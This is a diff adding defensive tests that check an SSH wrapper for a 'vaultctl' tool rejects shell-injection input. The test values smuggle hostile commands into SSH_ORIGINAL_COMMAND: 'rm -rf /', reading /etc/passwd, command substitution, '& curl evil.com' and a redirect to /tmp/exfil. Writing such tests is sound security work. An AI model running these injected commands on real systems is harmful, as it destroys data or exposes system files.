@@ -119,6 +119,60 @@ else
 fi
 
 # =============================================================================
+# Test: Shell injection attempts are rejected
+# =============================================================================
+
+echo "--- Testing: shell injection rejection ---"
+
+export SSH_ORIGINAL_COMMAND='vaultctl read file.md; rm -rf /'
+output=$("$WRAPPER" 2>&1 || true)
+if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
+    pass "wrapper rejects semicolon injection"
+else
+    fail "wrapper rejects semicolon injection" "rejection message" "$output"
+fi
+
+export SSH_ORIGINAL_COMMAND='vaultctl read file.md | cat /etc/passwd'
+output=$("$WRAPPER" 2>&1 || true)
+if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
+    pass "wrapper rejects pipe injection"
+else
+    fail "wrapper rejects pipe injection" "rejection message" "$output"
+fi
+
+export SSH_ORIGINAL_COMMAND='vaultctl read $(whoami).md'
+output=$("$WRAPPER" 2>&1 || true)
+if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
+    pass "wrapper rejects command substitution \$()"
+else
+    fail "wrapper rejects command substitution \$()" "rejection message" "$output"
+fi
+
+export SSH_ORIGINAL_COMMAND='vaultctl read `whoami`.md'
+output=$("$WRAPPER" 2>&1 || true)
+if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
+    pass "wrapper rejects backtick injection"
+else
+    fail "wrapper rejects backtick injection" "rejection message" "$output"
+fi
+
+export SSH_ORIGINAL_COMMAND='vaultctl read file.md & curl evil.com'
+output=$("$WRAPPER" 2>&1 || true)
+if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
+    pass "wrapper rejects background operator &"
+else
+    fail "wrapper rejects background operator &" "rejection message" "$output"
+fi
+
+export SSH_ORIGINAL_COMMAND='vaultctl read file.md > /tmp/exfil'
+output=$("$WRAPPER" 2>&1 || true)
+if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
+    pass "wrapper rejects redirect >"
+else
+    fail "wrapper rejects redirect >" "rejection message" "$output"
+fi
+
+# =============================================================================
 # Test: Logging
 # =============================================================================
 
